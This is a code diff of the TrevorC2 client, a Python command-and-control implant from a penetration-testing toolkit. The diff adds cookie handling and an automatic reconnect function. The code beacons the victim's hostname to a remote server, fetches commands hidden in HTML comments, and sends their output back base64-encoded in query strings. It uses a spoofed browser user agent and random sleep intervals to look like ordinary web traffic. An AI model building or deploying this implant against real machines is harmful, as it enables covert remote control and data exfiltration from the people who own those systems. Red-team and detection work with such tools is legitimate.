@@ -1,11 +1,11 @@
 #!/usr/bin/env python
 #
-# TrevorC2 - legitimate looking command and control 
+# TrevorC2 - legitimate looking command and control
 # Written by: Dave Kennedy @HackingDave
 # Website: https://www.trustedsec.com
 # GIT: https://github.com/trustedsec
 #
-# This is the client connection, and only an example. Refer to the readme 
+# This is the client connection, and only an example. Refer to the readme
 # to build your own client connection to the server C2 infrastructure.
 
 # CONFIG CONSTANTS:
@@ -36,10 +36,10 @@ CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")
 
 
 # python 2/3 compatibility, need to move this to python-requests in future
-try: 
+try:
     import urllib2 as urllib
     py = "2"
-except: 
+except:
     import urllib.request, urllib.parse, urllib.error
     py = "3"
 import random
@@ -51,6 +51,7 @@ from Crypto import Random
 from Crypto.Cipher import AES
 import sys
 import platform
+import cookielib
 
 # AES Support for Python2/3 - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
 class AESCipher(object):
@@ -98,32 +99,37 @@ def random_interval(time_interval1, time_interval2):
     return random.randint(time_interval1, time_interval2)
 
 hostname = platform.node()
+cookie = cookielib.CookieJar()
 
-# we need to registery our asset first
-while 1:
-    time.sleep(1)
-    try:
-        hostname_send  = cipher.encrypt("magic_hostname=" + hostname).encode('utf-8')
-        hostname_send = base64.b64encode(hostname_send).decode('utf-8')
+def connect_trevor():
+    # we need to registery our asset first
+    while 1:
+        time.sleep(1)
+        try:
+            hostname_send  = cipher.encrypt("magic_hostname=" + hostname).encode('utf-8')
+            hostname_send = base64.b64encode(hostname_send).decode('utf-8')
 
-        # pipe out stdout and base64 encode it then request via a query string parameter
-        if py == "3":
-            req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-            html = urllib.request.urlopen(req).read()
-            break
+            # pipe out stdout and base64 encode it then request via a query string parameter
+            if py == "3":
+                req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+                opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
+                html = urllib.request.urlopen(req).read()
+                break
+            else:
+                req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+                opener = urllib.build_opener(urllib.HTTPCookieProcessor(cookie))
+                html = opener.open(req).read()
+                break
 
-        else:
-            req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + hostname_send, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-            html = urllib.urlopen(req).read()
-            break
+        # handle exceptions and pass if the server is unavailable, but keep going
+        except Exception as error:
+            # if we can't communicate, just pass
+            if "Connection refused" in str(error):
+                pass
+            else:
+                print("[!] Something went wrong, printing error: " + str(error))
 
-    # handle exceptions and pass if the server is unavailable, but keep going
-    except Exception as error:
-        # if we can't communicate, just pass
-        if "Connection refused" in str(error):
-            pass
-        else:
-            print("[!] Something went wrong, printing error: " + str(error))
+connect_trevor()
 
 # main call back here
 while 1:
@@ -132,10 +138,12 @@ while 1:
         # request with specific user agent
         if py == "3":
             req = urllib.request.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
             html = urllib.request.urlopen(req).read().decode('utf-8')
         else:
             req = urllib.Request(SITE_URL + ROOT_PATH_QUERY, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-            html = urllib.urlopen(req).read().decode('utf-8')
+            opener = urllib.build_opener(urllib.HTTPCookieProcessor(cookie))
+            html = opener.open(req).read().decode('utf-8');
 
         # <!-- PARAM=bm90aGluZw== --></body> -  What we split on here on encoded site
         parse = html.split("<!-- %s" % (STUB))[1].split("-->")[0]
@@ -153,11 +161,13 @@ while 1:
                 # pipe out stdout and base64 encode it then request via a query string parameter
                 if py == "3":
                     req = urllib.request.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
+                    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie))
                     html = urllib.request.urlopen(req).read()
 
                 else:
                     req = urllib.Request(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + stdout_value, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'})
-                    html = urllib.urlopen(req).read()
+                    opener = urllib.build_opener(urllib.HTTPCookieProcessor(cookie))
+                    html = opener.open(req).read()
 
                 # sleep random interval and let cleanup on server side
                 time.sleep(random_interval(time_interval1, time_interval2))
@@ -166,7 +176,7 @@ while 1:
     except Exception as error:
         # if we can't communicate, just pass
         if "Connection refused" in str(error):
-            pass
+            connect_trevor()
         else:
             print("[!] Something went wrong, printing error: " + str(error))
 
